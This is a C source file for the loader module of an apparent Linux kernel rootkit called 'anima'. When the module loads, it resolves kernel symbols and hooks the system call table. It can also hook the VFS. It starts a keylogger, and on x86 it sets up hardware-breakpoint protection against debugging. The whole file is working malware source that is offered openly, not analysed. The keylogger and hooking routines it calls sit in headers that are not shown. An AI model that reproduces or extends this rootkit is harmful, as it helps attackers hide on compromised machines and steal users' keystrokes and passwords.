#include <linux/kernel.h>
#include <linux/module.h>

#include <anima/arch.h>
#include <anima/config.h>
#include <anima/debug.h>
#include <anima/keylogger.h>
#include <anima/ksyms.h>
#include <anima/syscalls.h>
#include <anima/vfs.h>

MODULE_LICENSE("GPL");

struct anima_config rk_cfg = {
	.state = RK_BOOT,
#ifdef ARCH_X86
	.dr_protect = 1,
	.patch_debug = 1,
#endif
	.hook_syscall = 1,
	.hook_vfs = 0,
	.keylogger = 1,
};

static int __init anima_init(void)
{
	int ret;

	pr_debug("%s: init\n", __func__);

	/* MUST be called first */
	ret = get_kernel_syms();
	if (ret)
		return 1;

	/* architecture specific */
	ret = arch_hw_breakpoint_init();
	if (ret)
		return 1;
	arch_hw_breakpoint_debug();

	if (rk_cfg.hook_syscall)
		hook_sys_call_table();
	if (rk_cfg.hook_vfs)
		vfs_hook();
	if (rk_cfg.keylogger)
		keylogger_init();
#if ARCH_X86
	if (rk_cfg.dr_protect)
		x86_hw_breakpoint_protect_enable();
#endif

	rk_cfg.state = RK_ACTIVE;

	return 0;
}

static void __exit anima_exit(void)
{
	rk_cfg.state = RK_SHUTDOWN;
	if (rk_cfg.keylogger)
		keylogger_exit();
#if ARCH_X86
	if (rk_cfg.dr_protect)
		x86_hw_breakpoint_protect_disable();
#endif

	pr_debug("%s: exit\n", __func__);

	/* architecture specific */
	arch_hw_breakpoint_exit();
}

module_init(anima_init);
module_exit(anima_exit);
